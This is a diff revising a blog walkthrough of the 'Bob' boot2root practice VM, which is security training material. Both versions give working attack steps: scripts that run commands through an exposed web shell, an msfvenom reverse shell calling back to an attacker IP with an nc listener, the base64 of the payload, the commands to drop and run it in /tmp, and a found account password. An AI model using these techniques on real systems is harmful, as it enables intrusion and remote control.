@@ -18,7 +18,7 @@ This post documents the complete walkthrough of Bob: 1.0.1, a boot2root [VM][1] 
 
 ### Background
 
-Someone attacked the Milburg Highschool Server. The IT staff took down their Windows server and replaced it with a Linux server running Debian. Find the weak points in the new server.
+Someone attacked the Milburg Highschool Server. The IT staff took down their Windows server and replaced it with a Linux server running Debian. Your mission, should you choose to accept, is to find the weak points in the new server.
 
 ### Information Gathering
 
@@ -47,7 +47,7 @@ PORT      STATE SERVICE REASON         VERSION
 
 ### Directory/Files Enumeration
 
-Besides the unverified files from `robots.txt`, you can run the following command to look for more files. These files are the hyperlinks found in the site's main page.
+Besides the unverified files from `robots.txt`, you can run the following command to look for more files. These files are at the end of the hyperlinks found in the site's landing page.
 
 ```
 # curl -s 192.168.20.130 | grep -Po '(href|src)=".*"' | cut -d'"' -f2
@@ -59,11 +59,12 @@ contact.html
 login.html
 WIP.jpg
 ```
-`contact.html` exposes the persons working in the IT department. We now know that Bob is the admin; we should probably be targeting him.
+
+`contact.html` exposes the personnel working in the IT department. We now know that Bob is the admin; we should probably be targeting him.
 
 ![0.c4gur4ofikg](/assets/images/posts/bob-walkthrough/0.c4gur4ofikg.png)
 
-Otherwise, there's nothing interesting with these files except for &mdash; `dev_shell.php`; it exposes a web shell, the first attack surface. This is how the web shell looks like.
+Otherwise, there's nothing interesting with these files except for &mdash; `dev_shell.php`. It exposes a web shell, the first attack surface, and this is how it looks like in the browser.
 
 ![0.jdsakljaao](/assets/images/posts/bob-walkthrough/0.jdsakljaao.png)
 
@@ -73,7 +74,7 @@ Although the web shell allows remote execution of commands in the context of `ww
 
 Essentially, `cat` reads a file's content and prints it to standard output in ASCII. If you've read permissions for the file, you can use `xxd` to achieve the same result, by first showing the content in hexadecimal, and then converting it back to ASCII before printing to standard output.
 
-I wrote `cat.sh` to show the idea of using `xxd` as the replacement for `cat`.
+I wrote `cat.sh` to establish the idea of using `xxd` as the replacement for `cat`.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -91,7 +92,7 @@ curl \
 | xxd -p -r
 {% endhighlight %}
 
-Another script I wrote, `ls.sh`, uses `find` as the replacement for `ls`.
+Another script I wrote &mdash; `ls.sh`, uses `find` as the replacement for `ls`.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -109,7 +110,7 @@ curl \
 | column -t
 {% endhighlight %}
 
-Using `ls.sh` to list the contents of a directory along with their permissions, is easy.
+Using `ls.sh` to list the files along with their permissions in a directory, is easy.
 ```
 # ./ls.sh /var/www/html
 396954  4     drwxr-xr-x  2  root  root  4096     Mar  8  23:48  /var/www/html
@@ -163,26 +164,33 @@ I can then use `cat.sh` to display the contents of any file where `www-data` has
   ...
 ```
 
-Now that we know how `dev_shell.php` works, we can work towards getting ourselves as proper shell.
+Now that we know how `dev_shell.php` works, let's get ourselves a proper shell.
 
 ### Low-privilege Shell
 
-Here's an overview of how we can get a low-privilege shell:
+Here's an overview of how you can get a low-privilege shell:
 
-1. Generate a reverse shell with `msfvenom` on your attacking machine
-2. Set up `netcat` listener on your attacking machine
-3. Encode the reverse shell in `base64` on your attacking machine
-4. Run `echo -n [output from Step 3] | base64 -d > /tmp/rev` in the web shell
-5. Run `chmod +x /tmp/rev` in the web shell
-6. Run `/tmp/rev` in the web shell
+On your attacking machine:
 
-***Step 1: Generate a reverse shell with `msfvenom` on your attacking machine***
+1. Generate a reverse shell with `msfvenom`.
+2. Set up `netcat` listener.
+3. Encode the reverse shell in `base64`.
 
-Before you generate the reverse shell, you need to determine the OS architecture the target host is running &mdash; by running `uname -a` in the web shell; `msfvenom` need this information to generate the executable reverse shell.
+In the web shell:
+
+<ol start="4">
+<li>Run <code>echo -n [output from #3] | base64 -d > /tmp/rev</code>.</li>
+<li>Run <code>chmod +x /tmp/rev</code> in the web shell.</li>
+<li>Run <code>/tmp/rev</code> in the web shell.</li>
+</ol>
+
+***Step 1: Generate a reverse shell with `msfvenom`***
+
+Before you generate the reverse shell, you need to determine the target's OS architecture &mdash; by running `uname -a` in the web shell. `msfvenom` needs this information to generate the correct reverse shell.
 
 ![0.roxsyv6gela](/assets/images/posts/bob-walkthrough/0.roxsyv6gela.png)
 
-The target host is running 64-bit Debian.
+The target is running 64-bit Debian.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
@@ -192,22 +200,22 @@ Final size of elf file: 194 bytes
 Saved as: rev
 ```
 
-***Step 2: Set up `netcat` listener on your attacking machine***
+***Step 2: Set up `netcat` listener***
 
 ```
 # nc -lnvp 4444
 ```
 
-***Step 3: Encode the reverse shell in `base64` on your attacking machine***
+***Step 3: Encode the reverse shell in `base64`***
 
 ```
 # base64 rev | tr -d  '\n' && echo
 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIAEVzAqBSAUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
 ```
 
-***Step 4: Run `echo -n [output from Step 3] | base64 -d > /tmp/rev` in the web shell***
+***Step 4: Run `echo -n [output from #3] | base64 -d > /tmp/rev`***
 
-Because the output of this step ends up in file redirection, you don't see anything visible in the web shell. You can use `md5sum` for verification on your attacking machine and in the web shell &mdash; to ensure the integrity of the reverse shell is intact and not modified.
+Because the output of this step ends up in file redirection, you don't see anything visible in the web shell. You can use `md5sum` for verification on your attacking machine and in the web shell &mdash; to ensure the integrity of the reverse shell is intact and unmodified.
 
 ```
 # md5sum rev
@@ -217,38 +225,38 @@ f05a125872c14d573304819ac2997782  rev
 
 Good. Both hashes are identical; both files are identical as well.
 
-***Step 5: Run `chmod +x /tmp/rev` in the web shell***
+***Step 5: Run `chmod +x /tmp/rev`***
 
 Although this step produces no visible output, you can use `ls.sh` to verify that `rev` is executable.
 
 ![0.kscltrqq2b](/assets/images/posts/bob-walkthrough/0.kscltrqq2b.png)
 
-***Step 6: Run `/tmp/rev` in the web shell***
+***Step 6: Run `/tmp/rev`***
 
 After this step, you should see a reverse shell in your `netcat` listener like so.
 
 ![0.zcmr8cq5i6l](/assets/images/posts/bob-walkthrough/0.zcmr8cq5i6l.png)
 
-You can spawn a better-looking shell with output control in Python.
+This is a well-known technique to spawn a shell with output control using Python.
 
 ![0.hgd8uk3pqv](/assets/images/posts/bob-walkthrough/0.hgd8uk3pqv.png)
 
 ### Privilege Escalation
 
-Depending on how fast you operate, the following information should be at your fingertips:
+By now, you should have gotten the following information at your fingertips:
 
 * Four accounts in the host: `bob`, `elliot`, `jc` and `seb`. They already made their first appearance in `contact.html`.
 * One account is missing: `c0rruptedb1t`
 * Bob is a man of secrets. He kept the following files at different locations:
-  * `staff.txt`, a text file dissing everyone in the IT department except himself.
-  * `.old_passwordfile.html`, the original copy of `passwords.html` &mdash; contains the passwords of `jc` and `seb`.
-  * `notes.sh`, a `bash` script that spits out incoherent phrases.
-  * `login.txt.gpg`, a file encrypted with symmetric cipher AES.
-* For some reason, Elliot detests Bob, and so he decided to change his password to `theadminisdumb`.
+  * `.old_passwordfile.html` &mdash; the original copy of `passwords.html`.
+  * `staff.txt` &mdash; a text file dissing everyone in the IT department except himself.
+  * `notes.sh` &mdash; a `bash` script that spits out incoherent phrases.
+  * `login.txt.gpg` &mdash; a file encrypted with AES symmetric cipher.
+* Elliot detests the admin, and so he decided to change his password to `theadminisdumb`. ¯\\_(ツ)_/¯
 
-Looking on as an outsider, the submerged power struggle and office politics among the IT folks of Milburg High is starting to surface, following the first security breach. I can't imagine what will happen if there's another security breach.
+Looking on as an outsider, the submerged power struggle and office politics among the IT guys of Milburg High is starting to surface following the first security breach. I can't imagine what will happen if there's another security breach.
 
-Like I said before, Bob is probaby the one we should be targeting, judging from the secrets he has been harboring. If I'd to guess, I'd say `login.txt.gpg` contains Bob's password and `notes.sh` contains the hints to decrypt `login.txt.gpg`.
+Like I said before, Bob is probably the one we should be targeting, judging from the secrets he has harbored. If I'd to guess, I'd say `login.txt.gpg` contains Bob's password and `notes.sh` contains the hints to decrypt `login.txt.gpg`.
 
 First, let's use `scp` to copy `login.txt.gpg` and `notes.sh` to my attacking machine. Both files are readable by everyone.
 
@@ -269,11 +277,13 @@ I googled and found [PGPCrack-NG](https://github.com/kholia/PGPCrack-NG). Accord
 
 >PGPCrack-NG is a program designed to brute-force symmetrically encrypted PGP files
 
-Fits the bill down to a T. Precisely what I need.
+Precisely what I need. Fits the bill down to a T.
 
-Like a child who found a new toy, I ran PGPCrack-NG with the wordlist and waited for the password to appear. No results at all. This can't be true.
+Like a child who has found a new toy, I ran PGPCrack-NG with the wordlist and waited for the password to appear &mdash; nothing at all.
 
-I ran `notes.sh` again. I kept staring at it. And then the **epiphany** came&hellip;
+I ran `notes.sh` again and again. I kept staring at it endlessly. This can't be true.
+
+And then the **epiphany** came&hellip;
 
 ![0.z6pd10vab8](/assets/images/posts/bob-walkthrough/0.z6pd10vab8.png)
 
